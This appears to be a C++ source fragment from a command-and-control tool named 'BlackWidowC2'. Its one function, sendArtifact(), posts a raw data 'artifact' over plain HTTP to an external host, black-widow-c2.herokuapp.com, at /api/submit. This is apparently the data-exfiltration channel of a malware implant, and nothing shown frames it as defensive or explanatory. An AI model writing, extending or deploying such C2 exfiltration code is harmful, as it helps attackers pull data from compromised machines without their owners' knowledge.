#include "BlackWidowC2.h"
#include <iostream>
#include <chrono>
#include <thread>
#include <httplib.h>

void sendArtifact(const char* rawArtifact)
{
	httplib::Client cli("http://black-widow-c2.herokuapp.com");
	auto res = cli.Post(
		"/api/submit",
		rawArtifact,
		"application/json"
	);
}